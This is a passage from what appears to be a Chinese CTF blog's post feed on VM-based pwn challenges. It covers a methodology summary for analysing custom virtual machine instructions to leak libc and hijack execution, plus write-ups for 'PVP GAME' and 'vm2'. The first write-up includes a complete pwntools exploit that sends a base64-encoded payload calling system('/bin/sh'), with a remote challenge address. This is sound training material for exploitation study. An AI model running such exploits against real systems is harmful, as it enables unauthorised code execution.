punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>bufer_ptr <span class="token operator">+</span> <span class="token number">3</span></code></pre><h1 id="分析指令格式"><a href="#分析指令格式" class="headerlink" title="分析指令格式"></a>分析指令格式</h1><h2 id="是否被加密"><a href="#是否被加密" class="headerlink" title="是否被加密"></a>是否被加密</h2><ul><li><p>在run的时候是输入的原始数据还是输入的数据进行了加密，一般是进行解密然后输入的数据需要先加密。</p></li><li><p>有些会进行位交换，取其中几位分别为指令和操作数</p><p>这里写了移位的脚本</p></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#从fro到to进行移位操作,索引从0开始</span><span class="token keyword">def</span> <span class="token function">left</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>item<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffffffffffffff</span><span class="token keyword">def</span> <span class="token function">yiwei</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span>fro<span class="token punctuation">,</span>to<span class="token punctuation">,</span>bit<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> bit<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>        fro_bit<span class="token operator">=</span><span class="token punctuation">(</span>content<span class="token operator">>></span><span class="token punctuation">(</span>fro<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span> <span class="token comment" spellcheck="true">#取出来第fro位</span>        fro_bit_8<span class="token operator">=</span>fro_bit<span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#把fro位复制到其他位</span>        result<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>to <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fro_bit_8 <span class="token comment" spellcheck="true">#删除多余的</span>        <span class="token comment" spellcheck="true"># print("result:",hex(to))</span>        <span class="token keyword">return</span> result    <span class="token keyword">if</span> bit<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>        fro_bit <span class="token operator">=</span> <span class="token punctuation">(</span>content<span class="token operator">>></span><span class="token punctuation">(</span>fro<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>  <span class="token comment" spellcheck="true"># 取出来第fro位</span>        fro_bit_8 <span class="token operator">=</span> fro_bit<span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 把fro位复制到其他位</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>to <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> fro_bit_8  <span class="token comment" spellcheck="true"># 删除多余的</span>decoding<span class="token operator">=</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>注意这里实现的是解密，是什么样的输入经过二进制文件实现的加密之后变成想要的值。</p><p>从脚本角度就是想要的输入进行解密，然后发送</p><h2 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h2><ul><li><p>指令的长度，可以是变成也可以是定长</p></li><li><p>操作数和操作码所在的位置</p><h1 id="分析关键指令"><a href="#分析关键指令" class="headerlink" title="分析关键指令"></a>分析关键指令</h1><p>实际上实现的虚拟指令可能会很多，只需要下面指令类型中的一些即可</p></li></ul><h2 id="寄存器拷贝"><a href="#寄存器拷贝" class="headerlink" title="寄存器拷贝"></a>寄存器拷贝</h2><p>  不同寄存器之间的拷贝，相当于move指令，有了它会很方便</p><pre class=" language-c"><code class="language-c"> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token operator">-></span>reg_0 <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token operator">-></span>reg_0 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">get_opi_addr</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// reg_op1=reg_op2</span></code></pre><p>当然，实在不行可以用寄存器相加代替</p><h2 id="寄存器和栈，内存交互"><a href="#寄存器和栈，内存交互" class="headerlink" title="寄存器和栈，内存交互"></a>寄存器和栈，内存交互</h2><p>一般情况下栈或者寄存器是整个结构下的一个指针，修改这个指针再修改指针指向的内容可以实现任意地址写</p><pre class=" language-c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>esp_addr <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token operator">-></span>reg_0 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">get_opi_addr</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// *(esp-4)=reg_op1 指令长度为2   push reg_op1</span></code></pre><p>这里需要精确地汇编指令，可能ida反编译结果不准确，汇编指令可能是段寻址</p><pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span>00000000000011B5                 mov     rax<span class="token punctuation">,</span> cs<span class="token punctuation">:</span>EBP_qword_203058</code></pre><p>需要动态调试</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605697184140.png" alt="段寻址对应gdb调试"></p><p>确定是放到一个地址处还是放到一个地址指向的内容</p><h2 id="操作数读入寄存器"><a href="#操作数读入寄存器" class="headerlink" title="操作数读入寄存器"></a>操作数读入寄存器</h2><p>  实现交互</p><pre class=" language-c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token operator">-></span>reg_0 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">get_opi_addr</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr<span class="token operator">-></span>buffer_ptr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// reg_op1=(四字节)op2</span></code></pre><h2 id="内容输出"><a href="#内容输出" class="headerlink" title="内容输出"></a>内容输出</h2><p>用来计算地址，但是不常见，如果有多次输入可能会有这个指令</p><pre class=" language-c"><code class="language-c"><span class="token function">putchar</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>reg3<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// put_reg3</span></code></pre><h2 id="算数指令"><a href="#算数指令" class="headerlink" title="算数指令"></a>算数指令</h2><p>加载数据之后可以计算出相对的偏移得到想要的地址，不需要输出到显示器</p><h1 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h1><p>  劫持执行流主要有两种方式</p><ul><li>1、基地址加偏移量，修改偏移量就可以实现任意地址写，一般libc加载地址是变的，这个偏移量也会变，计算起来比较麻烦。</li><li>2、向一个地址处写入地址，再向这个地址写入值。这种方式简单但是需要程序里面提供这种两层地址的寻址方式。可以重点观察bss段写入的指针。</li></ul><h2 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h2><ul><li>puts指令输出地址指向的内容</li><li>load指令加载地址指向的内容</li></ul><p>两个需要一个，但是需要load指令得到地址指向内容的值</p><p>用寄存器数学运算计算出实际system地址的偏移，libc的基地址等</p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p>修改寄存器的方式在内存中写入一个地址（puts_got），向地址处写数据实现任意地址写(system)</p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> vmpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PVP GAME  粤湾证券</title>
      <link href="2020/11/18/PVP%20GAME%20%20%E7%B2%A4%E6%B9%BE%E8%AF%81%E5%88%B8/"/>
      <url>2020/11/18/PVP%20GAME%20%20%E7%B2%A4%E6%B9%BE%E8%AF%81%E5%88%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><pre class=" language-c"><code class="language-c">_QWORD <span class="token operator">*</span>__fastcall <span class="token function">sub_F7D</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> __int64 a4<span class="token punctuation">,</span> __int64 a5<span class="token punctuation">,</span> __int64 a6<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 opcode_val<span class="token punctuation">,</span> <span class="token keyword">char</span> op1_val<span class="token punctuation">,</span> __int64 op2_val<span class="token punctuation">)</span><span class="token punctuation">{</span>  _QWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>v10<span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>v11<span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>v12<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>opcode_val<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">==</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    ebp_addr<span class="token punctuation">[</span>esp_index_value<span class="token punctuation">]</span> <span class="token operator">=</span> op2_val<span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>esp_index_value<span class="token operator">++</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// push</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">></span> <span class="token number">0x10</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">==</span> <span class="token number">0x20</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token operator">--</span>esp_index_value<span class="token punctuation">;</span>      result <span class="token operator">=</span> ebp_addr<span class="token punctuation">;</span>      ebp_addr<span class="token punctuation">[</span>esp_index_value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// push 0</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">==</span> <span class="token number">0x40</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> esp_index_value <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">run_symbol</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">)</span><span class="token punctuation">;</span>        a2 <span class="token operator">=</span> ebp_addr<span class="token punctuation">[</span>esp_index_value <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">v10</span><span class="token punctuation">(</span>ebp_addr<span class="token punctuation">[</span>esp_index_value <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 运行函数，栈传参</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> esp_index_value <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">run_symbol</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">v11</span><span class="token punctuation">(</span>ebp_addr<span class="token punctuation">[</span>esp_index_value <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>esp_index_value<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>esp_index_value <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v12 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">run_symbol</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">)</span><span class="token punctuation">;</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">v12</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>只有一个栈，栈传参，直接运行函数指令格式为opcode+op1+op2<br>但是读入的数据会进行一个base64解密</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605681939785.png" alt="base64解密"></p><p>pwn和加密算法结合起来</p><p>exp也很简单</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>file_path <span class="token operator">=</span> <span class="token string">"./pwn"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token keyword">import</span> base64<span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            text_base<span class="token operator">=</span><span class="token number">0</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getCmd</span><span class="token punctuation">(</span>opcode<span class="token punctuation">,</span>op1<span class="token punctuation">,</span>op2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> p64<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>op1<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>op2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Push</span><span class="token punctuation">(</span>op2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> getCmd<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>op2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">RunFunction</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>name<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>debug_1<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x0000000000000FA9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#12是64位libc地址的长度  16是64位canary的长度 (不算0x)</span>result<span class="token operator">=</span>int<span class="token punctuation">(</span>info<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak str to int : "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>resultpayload<span class="token operator">=</span>Push<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>Push<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>RunFunction<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"code:"</span><span class="token punctuation">,</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> vmpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>粤湾银行 (vm2)</title>
      <link href="2020/11/14/%E7%B2%A4%E6%B9%BE%E9%93%B6%E8%A1%8C%20(vm2)%20/"/>
      <url>2020/11/14/%E7%B2%A4%E6%B9%BE%E9%93%B6%E8%A1%8C%20(vm2)%20/</url>
      
        <content type="html"><![CDATA[<h2 id="结构分析"><a href="#结构分析" class="headerlink" title="结构分析"></a>结构分析</h2><p>ptr指针的结构</p><pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span><span class="token function">sub_8049570</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  _DWORD <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>  v0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x2Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> v0<span class="token punctuation">;</span>  <span class="token operator">*</span>v0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">4u</span><span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//0x100</span>  v1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0xFC</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//stack_index初始化为v10末尾，是一个指针</span>  v1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">252</span><span class="token punctuation">;</span>  v1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>定义结构体，从run的第一个操作码的识别可以看出来栈地址，猜测寄存器</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605497520631.png" alt="初步的结构体"></p><h2 id="指令分析"><a href="#指令分析" class="headerlink" title="指令分析"></a>指令分析</h2><p>查看第一段代码</p><pre class=" language-c"><code class="language-c"> <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token 